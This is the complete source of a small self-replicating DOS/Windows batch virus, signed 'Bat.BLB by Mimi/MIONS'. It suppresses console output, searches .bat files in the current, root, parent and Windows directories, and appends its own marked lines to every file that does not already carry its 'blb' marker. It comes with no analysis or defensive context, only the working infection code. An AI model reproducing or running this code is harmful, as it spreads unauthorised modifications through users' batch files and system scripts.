@echo off > nul.blb
ctty nul > nul.blb
if "%1=="/blbost goto jedem_blb
for %%v in (*.bat \*.bat ..\*.bat %windir%\*.bat) do call %0 /blbost %%v
goto end_blb
:jedem_blb
find "blb"<%2> nul
if errorlevel 1 goto inf_blb
goto end_blb
:inf_blb
set blb=%2
find "blb"<%0>>%2
if errorlevel 1 find "blb"<%0>>%blb%
:end_blb
::Bat.BLB by Mimi/MIONS ...leider